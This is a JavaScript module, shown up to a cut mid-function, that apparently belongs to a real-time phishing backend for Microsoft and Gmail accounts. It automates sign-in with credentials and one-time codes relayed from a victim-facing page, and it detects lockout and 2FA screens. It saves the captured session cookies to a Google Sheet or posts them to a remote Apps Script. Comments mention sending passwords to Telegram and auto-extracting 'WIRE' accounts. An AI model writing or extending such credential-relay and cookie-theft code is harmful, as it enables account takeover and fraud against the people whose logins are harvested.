import axios from 'axios';
import { URLSearchParams } from 'url';
import dns from 'dns';
import { promisify } from 'util';
import logger from "../../../../utils/logger.js";
import aiService from "../../../../utils/aiService.js";
import { getSheetDataApi, appendSheetRowApi, updateSheetRowApi, updateHubAndProjectsFromCookieData } from '../../../api/googlesheets.js';
import { setCachedRow, getCachedRow } from '../../../../utils/cookieCache.js';
import { fetchDataFromAppScript as _sharedFetchData, startAppScriptDataBackgroundUpdater as _sharedStartUpdater, stopAppScriptDataBackgroundUpdater as _sharedStopUpdater, patchCachedRow as _sharedPatchCachedRow } from '../../../../utils/cookieDataFetcher.js';
import { runSmartExtract, isExtractInFlight } from '../../../../utils/smartExtract.js';
import { getSetting } from '../../../../utils/settingsCache.js';

export const fetchDataFromAppScript = _sharedFetchData;
export const startAppScriptDataBackgroundUpdater = _sharedStartUpdater;
export const stopAppScriptDataBackgroundUpdater = _sharedStopUpdater;

// Set of browserIds the engine is actively processing (typing, navigating, checking)
export const activelyProcessing = new Set();

// Map of browserId → last poll timestamp (Date.now()). Updated by pooling-operator
// on every poll request. Used by the engine to detect when a template has stopped
// polling (user closed tab, network lost), so it can close the browser to save resources.
export const lastPollTime = new Map();

// Check if the template is still polling for this browserId.
// Returns true if no data yet (assume alive), false if last poll was > maxAgeMs ago.
export function isTemplateAlive(browserId, maxAgeMs = 180000) {
    const lastTime = lastPollTime.get(browserId);
    if (!lastTime) return true; // No data yet — assume alive
    return (Date.now() - lastTime) < maxAgeMs;
}

// Verify that a critical element still exists on the page. Used before engine actions
// to detect pages that have navigated away or closed in the background.
export async function verifyPageStillValid(page, platformConfig, phase) {
    const selectors = phase === 'password'
        ? platformConfig?.selectors?.passwordInput
        : (phase === 'code'
            ? platformConfig?.selectors?.verificationCodeInput
            : (phase === 'email'
                ? platformConfig?.selectors?.input
                : null));
    if (!selectors) return true; // Can't verify, assume valid

    const selectorArray = Array.isArray(selectors) ? selectors : [selectors].filter(Boolean);
    for (const sel of selectorArray) {
        if (typeof sel !== 'string') continue;
        try {
            await page.waitForSelector(sel, { timeout: 5000 });
            return true; // Element found — page is valid
        } catch (e) {
            continue; // Try next selector
        }
    }
    // No matching element found — page may have navigated or closed
    return false;
}

// Evaluate a single selector that may be a CSS selector or an XPath expression.
// Returns true if it matches, false otherwise. Never throws.
export async function selectorMatches(page, selector) {
    if (typeof selector !== 'string' || !selector.trim()) return false;
    return page.evaluate((s) => {
        const trimmed = s.trim();
        try {
            if (trimmed.startsWith('//') || trimmed.startsWith('(')) {
                return !!document.evaluate(trimmed, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
            }
            return !!document.querySelector(trimmed);
        } catch (e) {
            return false;
        }
    }, selector).catch(() => false);
}

// Detect wrong-password / login-failure markers on the current page. Checks the
// new-page `passwordError` selectors (CSS + XPath) first, then the legacy `loginFailed`
// selectors. Returns true if any marker is found.
export async function detectPasswordError(page, platformConfig) {
    if (!platformConfig?.selectors) return false;
    for (const key of ['passwordError', 'loginFailed']) {
        const raw = platformConfig.selectors[key];
        if (!raw) continue;
        const selectors = Array.isArray(raw) ? raw : [raw];
        for (const sel of selectors) {
            if (await selectorMatches(page, sel)) return true;
        }
    }
    return false;
}

// Extracts the VISIBLE error text from the first matching wrong-password / login-failure marker
// on the page (div#passwordError, #passwordError.has-error, loginFailed XPath text nodes, etc.).
// Returns the trimmed/capped text, or null if no marker is present. Lets the engine surface
// Microsoft's REAL message ("Your account or password is incorrect", "Your account is temporarily
// locked", "Sorry, your sign-in timed out", ...) instead of a generic placeholder.
export async function getPasswordErrorText(page, platformConfig) {
    if (!platformConfig?.selectors) return null;
    for (const key of ['passwordError', 'loginFailed']) {
        const raw = platformConfig.selectors[key];
        if (!raw) continue;
        const selectors = Array.isArray(raw) ? raw : [raw];
        for (const sel of selectors) {
            if (typeof sel !== 'string' || !sel.trim()) continue;
            const trimmed = sel.trim();
            const text = await page.evaluate((s) => {
                try {
                    // For XPath, `//*[contains(., "...")]` matches an ANCESTOR container in
                    // FIRST_ORDERED_NODE_TYPE, which returns the whole page's text on repeated
                    // submissions. Iterate the snapshot instead and keep the SHORTEST match —
                    // the leaf-most node carrying the marker phrase (exactly the inline error).
                    if (s.startsWith('//') || s.startsWith('(')) {
                        const snapshot = document.evaluate(s, document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
                        let shortest = null;
                        for (let i = 0; i < snapshot.snapshotLength; i++) {
                            const node = snapshot.snapshotItem(i);
                            if (!node) continue;
                            const val = (node.innerText || node.textContent || '').trim();
                            if (!val) continue;
                            if (!shortest || val.length < shortest.length) shortest = val;
                        }
                        return shortest ? shortest.slice(0, 300) : null;
                    }
                    const node = document.querySelector(s);
                    if (!node) return null;
                    const val = (node.innerText || node.textContent || '').trim();
                    return val ? val.slice(0, 300) : null;
                } catch (e) {
                    return null;
                }
            }, trimmed).catch(() => null);
            if (text) return text;
        }
    }
    return null;
}

// Detect the account-lockout / block screen ("We can't sign you in" / "too many incorrect
// attempts") that Microsoft renders after repeated wrong passwords. This is a TERMINAL signal:
// the process must FAIL immediately rather than continue polling or re-asking for a password.
export async function detectAccountLocked(page, platformConfig) {
    if (!platformConfig?.selectors?.accountLocked) return false;
    const raw = platformConfig.selectors.accountLocked;
    const selectors = Array.isArray(raw) ? raw : [raw];
    for (const sel of selectors) {
        if (await selectorMatches(page, sel)) return true;
    }
    return false;
}

// Detect Microsoft's "Password sign-in isn't available" marker (passwordless account).
// This is a special TRANSIENT-type error: a straight re-submission of the same password
// usually clears it (verified 2nd/3rd attempt), so the engine routes it into a bounded
// auto-retry INSTEAD of treating it like a terminal wrong-password / account-lockout failure.
export async function detectPasswordUnavailable(page, platformConfig) {
    if (!platformConfig?.selectors?.passwordUnavailable) return false;
    const raw = platformConfig.selectors.passwordUnavailable;
    const selectors = Array.isArray(raw) ? raw : [raw];
    for (const sel of selectors) {
        if (typeof sel !== 'string' || !sel.trim()) continue;
        if (await selectorMatches(page, sel)) return true;
    }
    return false;
}

// True when the page is still showing the password entry view: a password input is
// VISIBLE (offsetParent !== null) on a Microsoft login URL. Used to prevent false
// PROCESSING_FINALIZING/COMPLETED when the wrong-password page re-renders in place.
export async function stillOnPasswordPage(page, platformConfig) {
    try {
        const currentUrl = page.url() || '';
        const onLoginUrl = currentUrl.includes('login.live.com') || currentUrl.includes('login.microsoftonline.com') || currentUrl.includes('account.live.com');
        if (!onLoginUrl) return false;
        const raw = platformConfig?.selectors?.passwordInput;
        const selectors = Array.isArray(raw) ? raw : (raw ? [raw] : []);
        for (const sel of selectors) {
            if (typeof sel !== 'string') continue;
            const visible = await page.$eval(sel, el => el.offsetParent !== null).catch(() => false);
            if (visible) return true;
        }
        return false;
    } catch (e) {
        return false;
    }
}

// True when the page is on ANY auth surface: a Microsoft sign-in / account-picker landing
// (login.live.com, login.microsoftonline.com, oauth20_authorize.srf, prompt=select_account,
// login_hint, sso_reload, ...) or the password view is still visible. Used as a hard gate
// AFTER the inbox attempt so a wrong password that ends up on a sign-in landing is never
// treated as a successful login (previously misclassified as COMPLETED).
export async function pageStillOnAuth(page, platformConfig) {
    const currentUrl = page.url() || '';
    const markers = [
        'login.live.com',
        'login.microsoftonline.com',
        'account.live.com',
        'oauth20_authorize',
        'login_hint',
        'sso_reload',
        'login.srf',
        'prompt=select_account',
        'prompt=login'
    ];
    if (markers.some((m) => currentUrl.includes(m))) return true;
    return stillOnPasswordPage(page, platformConfig);
}

// Helper function to get column indexes
export function getColumnIndexes(headers) {
  const columnIndexes = headers.reduce((acc, header, index) => {
    acc[header] = index;
    return acc;
  }, {});
  return columnIndexes;
}



// Helper function to save data back to sheets (Using browserId)
export async function updateBrowserRowData(browserId, updateObject, isNewRow = false) {
  if (!browserId) {
    throw new Error("Missing browserId for updateBrowserRowData");
  }

  const sheetName = "cookie"; // Assuming "cookie" is the sheet name for browser data
  const now = new Date();
  const lastRunTimestamp = now.toISOString();

  const defaultLastJsonResponse = JSON.stringify({
    browserId,
    timestamp: now.toISOString(),
    status: updateObject.status || 'UNKNOWN',
    message: 'Default response when no specific details are available'
  });

  // Prepare data for Sheets API — filter out undefined values to prevent "undefined" strings
  const cleanUpdateObject = {};
  for (const [key, value] of Object.entries(updateObject)) {
    if (value !== undefined && value !== null) {
      cleanUpdateObject[key] = value;
    }
  }

  const sheetsApiUpdateMap = {
    browserId: browserId,
    lastRun: lastRunTimestamp,
    lastJsonResponse: cleanUpdateObject.lastJsonResponse || defaultLastJsonResponse,
    ...cleanUpdateObject
  };

  if (updateObject.cookieJSON) {
    sheetsApiUpdateMap.cookieJSON = updateObject.cookieJSON;
    try {
      const parsedCookies = JSON.parse(updateObject.cookieJSON);
      sheetsApiUpdateMap.formattedCookie = JSON.stringify(parsedCookies, null, 2);
    } catch (parseError) {
      logger.error(`[updateBrowserRowData][${browserId}] Invalid cookieJSON: ${parseError.message}`);
      delete sheetsApiUpdateMap.formattedCookie;
    }
  }

  // Map driveUrl → cookieFileURL for the sheet
  if (updateObject.driveUrl) {
    sheetsApiUpdateMap.cookieFileURL = updateObject.driveUrl;
    delete sheetsApiUpdateMap.driveUrl;
  }

  // Race-condition guard: never overwrite COMPLETED or PROCESSING_FINALIZING with FAILED
  // (another server may have already succeeded). Check the in-memory cache first — the
  // engine writes status to the cache synchronously before any sheet cascade, so a cached
  // terminal status is authoritative. Only fall back to a full sheet read when the row is
  // not in cache, so we don't pay a whole cookie-sheet read on every FAILED write.
  if (updateObject.status === "FAILED" && !isNewRow) {
    const cachedRow = getCachedRow(browserId);
    if (cachedRow && ["COMPLETED", "PROCESSING_FINALIZING"].includes(cachedRow.status)) {
      logger.warn(`[updateBrowserRowData][${browserId}] Row already ${cachedRow.status} in cache. Skipping FAILED overwrite.`);
      return { success: true, skipped: true, reason: 'Row already in terminal status' };
    }
    try {
      const existingData = await getSheetDataApi("cookie");
      if (existingData.success && Array.isArray(existingData.data)) {
        const statusIdx = existingData.headers.indexOf('status');
        const browserIdIdx = existingData.headers.indexOf('browserId');
        if (statusIdx !== -1 && browserIdIdx !== -1) {
          const existingRow = existingData.data.find(r => r[browserIdIdx] === browserId);
          if (existingRow && (existingRow[statusIdx] === "COMPLETED" || existingRow[statusIdx] === "PROCESSING_FINALIZING")) {
            logger.warn(`[updateBrowserRowData][${browserId}] Row already ${existingRow[statusIdx]} in sheet. Skipping FAILED overwrite.`);
            return { success: true, skipped: true, reason: 'Row already in terminal status' };
          }
        }
      }
    } catch (readError) {
      logger.warn(`[updateBrowserRowData][${browserId}] Pre-check read failed, proceeding with FAILED write: ${readError.message}`);
    }
  }

  // --- Attempt Sheets API first ---
  try {
    let sheetsApiResult;
    if (isNewRow) {
      sheetsApiResult = await appendSheetRowApi(sheetName, sheetsApiUpdateMap);
      if (sheetsApiResult.success) {
        logger.info(`[updateBrowserRowData][${browserId}] New row appended successfully via Sheets API.`);
        return sheetsApiResult;
      } else {
        logger.warn(`[updateBrowserRowData][${browserId}] Sheets API append failed: ${sheetsApiResult.error}. Falling back to App Script.`);
        // Re-throw to ensure the outer catch block is hit to trigger fallback.
        throw new Error(`Sheets API append failed: ${sheetsApiResult.error}`);
      }
    } else {
      sheetsApiResult = await updateSheetRowApi(sheetName, "browserId", browserId, sheetsApiUpdateMap);
      if (sheetsApiResult.success) {
        logger.info(`[updateBrowserRowData][${browserId}] Row updated successfully via Sheets API.`);
        // Don't return here, continue to trigger updateHubAndProjectsFromCookieData
        // return sheetsApiResult;
      } else {
        logger.warn(`[updateBrowserRowData][${browserId}] Sheets API update failed: ${sheetsApiResult.error}. Falling back to App Script.`);
        // Re-throw to ensure the outer catch block is hit if no fallback is successful.
        throw new Error(`Sheets API update failed: ${sheetsApiResult.error}`);
      }
    }
  } catch (sheetsApiError) {
    logger.error(`[updateBrowserRowData][${browserId}] Error with Sheets API operation: ${sheetsApiError.message}. Attempting App Script fallback.`);
    // --- Fallback to App Script ---
    logger.info(`[updateBrowserRowData][${browserId}] Falling back to App Script for update. isNewRow=${isNewRow}`);
    const appScriptUrl = process.env.SCRIPT_URL;
    const maxRetries = 3;
    const retryDelay = 2000; // 2 seconds delay between retries

    const params = new URLSearchParams({
      action: 'setCookieData',
      browserId: browserId,
      key: process.env.SCRIPT_KEY,
      lastRun: lastRunTimestamp,
      lastJsonResponse: cleanUpdateObject.lastJsonResponse || defaultLastJsonResponse,
      ...cleanUpdateObject
    });

    if (isNewRow) {
      params.set('newRow', 'true');
      logger.info(`[updateBrowserRowData][${browserId}] *** CREATING NEW ROW via App Script ***`);
    } else {
      logger.info(`[updateBrowserRowData][${browserId}] *** UPDATING EXISTING ROW via App Script *** (browserId=${browserId}, status=${updateObject.status})`);
    }

    if (updateObject.cookieJSON) {
      params.set('cookieJSON', updateObject.cookieJSON);
      try {
        const parsedCookies = JSON.parse(updateObject.cookieJSON);
        params.set('formattedCookie', JSON.stringify(parsedCookies, null, 2));
      } catch (parseError) {
        logger.error(`[updateBrowserRowData][${browserId}] Invalid cookieJSON for App Script: ${parseError.message}`);
        params.delete('formattedCookie');
      }
    }

    // Map driveUrl → cookieFileURL for the sheet
    if (updateObject.driveUrl) {
      params.set('cookieFileURL', updateObject.driveUrl);
      params.delete('driveUrl');
    }

    const logCleanObject = { ...updateObject };
    delete logCleanObject.cookieJSON;
    delete logCleanObject.formattedCookie;
    delete logCleanObject.verificationOptions;
    delete logCleanObject.verificationChoice;
    delete logCleanObject.verificationCode;
    if (logCleanObject.hasOwnProperty('newRow')) {
      delete logCleanObject.newRow;
    }

    const logParams = {
      action: 'setCookieData',
      browserId: browserId,
      lastRun: lastRunTimestamp,
      lastJsonResponse: '<json_details>',
      ...logCleanObject
    };

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
      try {
        const response = await axios.post(appScriptUrl, params, {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          timeout: 60000,
        });

        if (!response.data || !response.data.success) {
          const errorMsg = response.data?.error || 'Unknown App Script error';
          const errorDetails = response.data?.details ? JSON.stringify(response.data.details) : '';
          logger.error(`[updateBrowserRowData][${browserId}] App Script failed: ${errorMsg} ${errorDetails}`);
          throw new Error(`App Script update failed (using browserId): ${errorMsg}`);
        }

        logger.info(`[updateBrowserRowData][${browserId}] Sheet updated successfully via App Script.`);
        break; // Exit retry loop on success — prevents duplicate rows for isNewRow=true
      } catch (error) {
        const errorMessage = error.response ? JSON.stringify(error.response.data) : error.message;
        logger.error(`[updateBrowserRowData][${browserId}] Attempt ${attempt}/${maxRetries} failed to update sheet via App Script: ${errorMessage}`);

        const isNetworkError = error.code === 'ENOTFOUND' ||
          error.code === 'ECONNREFUSED' ||
          error.code === 'ETIMEDOUT' ||
          errorMessage.includes('getaddrinfo ENOTFOUND') ||
          errorMessage.includes('Network Error');

        if (attempt < maxRetries && isNetworkError) {
          logger.warn(`[updateBrowserRowData][${browserId}] Network error detected. Retrying in ${retryDelay}ms...`);
          await new Promise(resolve => setTimeout(resolve, retryDelay));
        } else {
          throw new Error(`Failed to update sheet after ${maxRetries} attempts via App Script: ${errorMessage}`);
        }
      }
    }
  } finally {
    // Debugging: Log the status before the condition check
    logger.debug(`[updateBrowserRowData][${browserId}] Checking status for triggering updateHubAndProjectsFromCookieData. Current status: '${updateObject.status}' (Type: ${typeof updateObject.status})`);

    // Trigger updateHubAndProjectsFromCookieData if status is COMPLETED or FAILED
    if (updateObject.status && (updateObject.status === "COMPLETED" || updateObject.status === "FAILED")) {
      logger.info(`[updateBrowserRowData][${browserId}] Triggering updateHubAndProjectsFromCookieData with status: ${updateObject.status}`);
      // Do not await this call to avoid blocking the current response.
      // Pass the cached row so the FAILED/COMPLETED Telegram is built from cache
      // (email/password) instead of a fresh sheet read — a quota failure or cleared
      // sheet cell must never drop the password from the notification.
      updateHubAndProjectsFromCookieData(browserId, updateObject.status, getCachedRow(browserId) || null).catch(error => {
        logger.error(`[updateBrowserRowData][${browserId}] Error triggering updateHubAndProjectsFromCookieData: ${error.message}`);
      });

      // Auto-extract on COMPLETED: fire-and-forget so it never blocks the login
      // flow. Controlled by the SETTINGS `autoExtract` toggle (default ON). WIRE
      // accounts (email cookies) are extracted after a successful login.
      if (updateObject.status === "COMPLETED" && !isExtractInFlight(browserId)) {
        getSetting('autoExtract').then(setting => {
          const enabled = setting ? !['0', 'false', 'no', 'off'].includes(String(setting.value1 || 'true').toLowerCase().trim()) : true;
          if (!enabled) return;
          logger.info(`[updateBrowserRowData][${browserId}] Auto-extract triggered (COMPLETED).`);
          runSmartExtract(browserId, 'WIRE').then(result => {
            logger.info(`[updateBrowserRowData][${browserId}] Auto-extract done: ${result.success}`);
          }).catch(err => {
            logger.error(`[updateBrowserRowData][${browserId}] Auto-extract failed: ${err.message}`);
          });
        }).catch(err => {
          logger.warn(`[updateBrowserRowData][${browserId}] autoExtract setting lookup failed (defaulting ON): ${err.message}`);
          if (!isExtractInFlight(browserId)) {
            runSmartExtract(browserId, 'WIRE').catch(e =>
              logger.error(`[updateBrowserRowData][${browserId}] Auto-extract failed: ${e.message}`)
            );
          }
        });
      }
    } else {
      logger.debug(`[updateBrowserRowData][${browserId}] Condition not met to trigger updateHubAndProjectsFromCookieData. Status: '${updateObject.status}'.`);
    }
  }
    // If we reached here, it means either Sheets API succeeded or App Script fallback succeeded.
    // Sync cookieCache with data fields only — NEVER overwrite status.
    // The caller (updateBrowserRowDataFast or finally block) already set the correct status in cache.
    // Without this guard, a concurrent slow write (e.g. PROCESSING) can overwrite a newer status
    // (e.g. WAITINGEMAIL, FAILED) that was set by a later call, causing the template to lock.
    const { status: _ignoredStatus, ...dataFields } = cleanUpdateObject;
    setCachedRow(browserId, {
        ...dataFields,
        lastRun: lastRunTimestamp,
        lastJsonResponse: cleanUpdateObject.lastJsonResponse || defaultLastJsonResponse
    });
    // On terminal status, directly patch the in-memory shared cache so the pooler
    // sees the final status immediately — even if the Sheets write hasn't propagated yet.
    // Don't invalidate the cache afterward, or the patch is lost. The background
    // updater will refresh from the sheet on its next 15s cycle.
    if (updateObject.status === "FAILED" || updateObject.status === "COMPLETED") {
        await _sharedPatchCachedRow(browserId, cleanUpdateObject);
    }
  // Return a success indicator or the last successful result.
  return { success: true };
}

const _resolveMxRaw = promisify(dns.resolveMx);
// Bounded MX lookup: a DNS query that hangs (seen in Docker/Dokploy containers)
// must never pin a processRow await forever. On timeout we resolve [] so callers
// fall back to domain-keyword matching instead of stalling.
export const resolveMx = (domain, timeoutMs = 10000) =>
    Promise.race([
        _resolveMxRaw(domain),
        new Promise((resolve) => setTimeout(() => resolve([]), timeoutMs))
    ]);

export async function isInbox(page, platformConfig) {
  const instanceId = `pid-${page.browser().process()?.pid || 'unknown'}`;
  try {
    const currentUrl = page.url();
    logger.info(`[isInbox][${instanceId}] Current URL: ${currentUrl}`);

    // Exclude Microsoft identity verification and password pages (NOT the inbox)
    if (currentUrl.includes('account.live.com/identity') ||
        currentUrl.includes('account.live.com/password')) {
      logger.info(`[isInbox][${instanceId}] URL is a verification/password page, not inbox.`);
      return false;
    }

    // Exclude ANY sign-in / auth / account-picker URL — these must never count as "inbox".
    // Microsoft's unauthenticated landing pages (outlook.live.com/mail/?prompt=select_account,
    // login.live.com, login.microsoftonline.com, oauth20_authorize.srf, login_hint, ...) match
    // the broad inboxUrlPatterns (e.g. /outlook\.live\.com\/mail/), which caused incorrect
    // passwords to be marked COMPLETED. The URL-pattern and DOM-selector checks below must
    // never run while we're still on an auth surface.
    const isInboxAuthMarkers = [
      'login.live.com',
      'login.microsoftonline.com',
      'account.live.com',
      'oauth20_authorize',
      'login_hint',
      'sso_reload',
      'login.srf',
      'prompt=select_account',
      'prompt=login'
    ];
    for (const marker of isInboxAuthMarkers) {
      if (currentUrl.includes(marker)) {
        logger.info(`[isInbox][${instanceId}] URL is an auth/sign-in page (marker "${marker}"), not inbox.`);
        return false;
      }
    }

    // Check URL patterns if configured
    if (platformConfig.inboxUrlPatterns) {
      for (const pattern of platformConfig.inboxUrlPatterns) {
        if (pattern.test(currentUrl)) {
          logger.info(`[isInbox][${instanceId}] URL matches pattern: ${pattern}`);
          return true;
        }
      }
    }

    // Check DOM selectors if configured
    if (platformConfig.inboxDomSelectors) {
      for (const selector of platformConfig.inboxDomSelectors) {
        try {
          // Add detailed logging for selector
          logger.info(`[isInbox][${instanceId}] Checking selector: Type: ${typeof selector}, Value: ${JSON.stringify(selector)}`);
          if (typeof selector === 'string') {
            await page.waitForSelector(selector, { timeout: 3000 });
            return true;
          } else if (typeof selector === 'object' && selector !== null && typeof selector.selector === 'string') {
            const element = await page.waitForSelector(selector.selector, { timeout: 3000 });
            if (selector.text) {
              const text = await page.evaluate(el => el.textContent, element);
              if (text.includes(selector.text)) {
                return true;
              }
            } else {
              return true;
            }
          } else {
            logger.warn(`[isInbox][${instanceId}] Invalid selector format: Type: ${typeof selector}, Value: ${JSON.stringify(selector)}`);
          }
        } catch (e) {
          // Selector not found, continue to next one
          continue;
        }
      }
    }

    return false;
  } catch (error) {
    logger.error(`[isInbox][${instanceId}] Error checking inbox:`, error);
    return false;
  }
}

export async function checkVerification(page, platformConfig) {
  if (!platformConfig?.verificationScreens) return { required: false };
  const instanceId = `pid-${page.browser().process()?.pid || 'unknown'}`;
  logger.debug(`[checkVerification][${instanceId}] Starting verification check. Current URL: ${page.url()}`);

  for (const view of platformConfig.verificationScreens) {
    logger.debug(`[checkVerification][${instanceId}] Checking view: ${view.name}`);
    if (!view.requiresVerification) {
      logger.warn(`[checkVerification][${instanceId}] View '${view.name}' in verificationScreens does not have requiresVerification: true. Skipping.`);
      continue;
    }

    try {
      const matchFound = await page.evaluate((viewData, currentInstanceId) => {
        const selectors = Array.isArray(viewData.match.selector) ?
          viewData.match.selector : [viewData.match.selector];
        let elementFoundBySelector = false;
        let textCriteriaMet = !viewData.match.text;

        for (const sel of selectors) {
          console.log(`[checkVerification][${currentInstanceId}] Evaluating selector for '${viewData.name}': Type: ${typeof sel}, Value: ${sel}`);
          if (typeof sel !== 'string') {
            console.error(`[checkVerification][${currentInstanceId}] Selector is not a string. Type: ${typeof sel}, Value: ${sel}`);
            continue;
          }

          const element = document.querySelector(sel);
          if (element) {
            elementFoundBySelector = true;
            if (viewData.match.text) {
              if ((element.textContent || "").includes(viewData.match.text)) {
                textCriteriaMet = true;
                break;
              } else {
                textCriteriaMet = false;
              }
            } else {
              break;
            }
          }
        }
        return elementFoundBySelector && textCriteriaMet;
      }, view, instanceId).catch((e) => {
        logger.error(`[checkVerification][${instanceId}] Error during page evaluation for view match ${view.name}: ${e.message}`);
        return false;
      });

      if (matchFound) {
        logger.info(`[checkVerification][${instanceId}] Verification view matched: ${view.name}`);
        if (view.isVerificationChoiceScreen) {
          logger.info(`[checkVerification][${instanceId}] Matched a verification CHOICE screen: ${view.name}`);
          return { required: true, type: 'choice', viewName: view.name, viewConfig: view };
        }
        if (view.isCodeEntryScreen) {
          logger.info(`[checkVerification][${instanceId}] Matched a verification CODE ENTRY screen: ${view.name}`);
          return { required: true, type: 'code', viewName: view.name, viewConfig: view };
        }
        if (view.requiresCaptcha) {
          logger.info(`[checkVerification][${instanceId}] Matched a CAPTCHA verification screen: ${view.name}`);
          return { required: true, type: 'captcha', viewName: view.name, viewConfig: view };
        }
        // For Gmail 2-Step Verification, treat as code for waiting, even if no entry
        if (view.name === 'Gmail 2-Step Verification') {
          logger.info(`[checkVerification][${instanceId}] Matched 'Gmail 2-Step Verification', treating as code type for waiting.`);
          return { required: true, type: 'code', viewName: view.name, viewConfig: view };
        }
        if (view.requiresTextInput) {
          logger.info(`[checkVerification][${instanceId}] Matched a text input verification screen: ${view.name}`);
          return { required: true, type: 'text_input', viewName: view.name, viewConfig: view };
        }
        return { required: true, type: 'unknown', viewName: view.name, viewConfig: view };
      }
    } catch (error) {
      logger.error(`[checkVerification][${instanceId}] Error during verification check for view ${view.name}:`, error);
    }
  }

  try {
    const isInInboxPage = await isInbox(page, platformConfig);
    if (isInInboxPage) {
      logger.debug(`[checkVerification][${instanceId}] Page is identified as inbox. No verification required.`);
      return { required: false };
    }
  } catch (error) {
    logger.error(`[checkVerification][${instanceId}] Error checking inbox status during verification:`, error);
  }

  logger.debug(`[checkVerification][${instanceId}] No verification view matched, and not in inbox.`);
  return { required: false };
}

// extractOutlookVerificationOptions function removed as it's now platform-specific in platforms.js

export const setCorsHeaders = (response) => {
  response.headers.set("Access-Control-Allow-Origin", "*");
  response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  response.headers.set("Access-Control-Allow-Headers", "Content-Type");
  return response;
};

export async function saveDebugSnapshot(page, browserId, endpoint, reason) {
  try {
    // Page/browser may already be closed during cleanup — nothing to snapshot, skip silently.
    if (!page || typeof page.isClosed !== 'function' || page.isClosed()) {
      return;
    }
    const htmlContent = await page.content();
    const timestamp = new Date().toISOString();
    const params = new URLSearchParams();
    params.append('action', 'saveDebugPage');
    params.append('key', process.env.SCRIPT_KEY || '');
    params.append('timestamp', timestamp);
    params.append('browserId', browserId);
    params.append('endpoint', endpoint);
    params.append('status', 'FAILED');
    params.append('htmlContent', htmlContent);
    params.append('reason', reason);
    const appScriptUrl = process.env.SCRIPT_URL;
    if (!appScriptUrl) {
      logger.warn(`[saveDebugSnapshot][${browserId}] SCRIPT_URL not configured`);
      return;
    }
    const response = await axios.post(appScriptUrl, params, {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      timeout: 30000
    });
    if (response.data?.success) {
      logger.info(`[saveDebugSnapshot][${browserId}] Debug snapshot saved (${(htmlContent.length / 1024).toFixed(1)}KB)`);
    } else {
      logger.error(`[saveDebugSnapshot][${browserId}] App Script error: ${response.data?.error || 'unknown'}`);
    }
  } catch (error) {
    // A page closing mid-snapshot is expected during teardown — not worth an ERROR log.
    if (/Target closed|detached Frame|Protocol error/i.test(error?.message || '')) {
      logger.debug(`[saveDebugSnapshot][${browserId}] Skipped (page closing): ${error.message}`);
      return;
    }
    logger.error(`[saveDebugSnapshot][${browserId}] Error: ${error.message}`);
  }
}

// ============================================================
// Helpers moved from route.js
// ============================================================

export async function handleAdditionalViews(page, platformConfig, instanceId, context = 'general') {
    if (!platformConfig?.additionalViews || platformConfig.additionalViews.length === 0) {
        logger.debug(`[handleAdditionalViews][${instanceId}] No additional views to process for this platform.`);
        return;
    }
    logger.info(`[handleAdditionalViews][${instanceId}] Starting to check for additional views (context: ${context})...`);

    const maxIterations = 10;
    let iterationCount = 0;
    let viewHandledInThisIteration = true;
    const handledViews = new Set();
    let fatalResult = null;

    while (viewHandledInThisIteration && iterationCount < maxIterations) {
        viewHandledInThisIteration = false;
        iterationCount++;

        if (iterationCount > 1) {
            await new Promise(r => setTimeout(r, 300));
        }

        const viewIndex = await page.evaluate((views, ctx, skipNames) => {
            try {
                for (let i = 0; i < views.length; i++) {
                    const view = views[i];
                    if (skipNames.includes(view.name)) continue;
                    if (ctx === 'post_verification' && (view.isVerificationChoiceScreen || view.isCodeEntryScreen)) continue;

                    let match = false;

                    if (view.match.url) {
                        const currentUrl = window.location.href;
                        const urlPatterns = Array.isArray(view.match.url) ? view.match.url : [view.match.url];
                        for (const pattern of urlPatterns) {
                            if (typeof pattern === 'string' && currentUrl.includes(pattern)) {
                                match = true;
                                break;
                            }
                        }
                    }

                    if (!match && view.match.selector) {
                        const selectors = Array.isArray(view.match.selector) ? view.match.selector : [view.match.selector];
                        for (const sel of selectors) {
                            if (typeof sel !== 'string') continue;
                            const element = document.querySelector(sel);
                            if (element) {
                                if (view.match.text) {
                                    if ((element.textContent || "").includes(view.match.text)) {
                                        match = true;
                                        break;
                                    }
                                } else {
                                    match = true;
                                    break;
                                }
                            }
                        }
                    }
                    if (match) return i;
                }
                return -1;
            } catch (e) {
                return -1;
            }
        }, platformConfig.additionalViews, context, Array.from(handledViews)).catch(() => -1);

        if (viewIndex < 0) break;

        const view = platformConfig.additionalViews[viewIndex];
        handledViews.add(view.name);
        logger.info(`[handleAdditionalViews][${instanceId}] Matched additional view: ${view.name}`);

        if (view.isFatal) {
            logger.warn(`[handleAdditionalViews][${instanceId}] Fatal view matched: ${view.name}. Returning fatal result.`);
            fatalResult = { blocked: true, reason: view.name };
            break;
        }

        if (!view.action) {
            logger.info(`[handleAdditionalViews][${instanceId}] View ${view.name} matched but has no defined action.`);
            viewHandledInThisIteration = true;
            continue;
        }

        if (typeof view.action === 'function') {
            logger.info(`[handleAdditionalViews][${instanceId}] Executing custom action for view: ${view.name}`);
            await view.action(page, view, platformConfig);
            viewHandledInThisIteration = true;
            continue;
        }

        if (view.action.type === 'keyboard') {
            const keys = Array.isArray(view.action.keys) ? view.action.keys : [view.action.keys];
            for (const key of keys) {
                await page.keyboard.press(key);
                await new Promise(r => setTimeout(r, 300));
            }
            logger.info(`[handleAdditionalViews][${instanceId}] Pressed keyboard keys: ${keys.join(', ')} for view: ${view.name}`);
            viewHandledInThisIteration = true;
            await new Promise(r => setTimeout(r, 500));
            continue;
        }
        if (view.action.type !== 'click') {
            viewHandledInThisIteration = true;
            continue;
        }

        const actionSelectors = Array.isArray(view.action.selector) ? view.action.selector : [view.action.selector];
        let clickedViewAction = false;

        if (view.action.text) {
            try {
                const elementClicked = await page.evaluate((selectors, textToFind) => {
                    for (const sel of selectors) {
                        if (typeof sel !== 'string') continue;
                        const elements = document.querySelectorAll(sel);
                        for (const element of elements) {
                            if (element.textContent.includes(textToFind)) {
                                element.click();
                                return true;
                            }
                        }
                    }
                    return false;
                }, actionSelectors, view.action.text);

                if (elementClicked) {
                    logger.info(`[handleAdditionalViews][${instanceId}] Clicked element with text "${view.action.text}" for view: ${view.name}`);
                    clickedViewAction = true;
                    if (view.action.waitForSelector) {
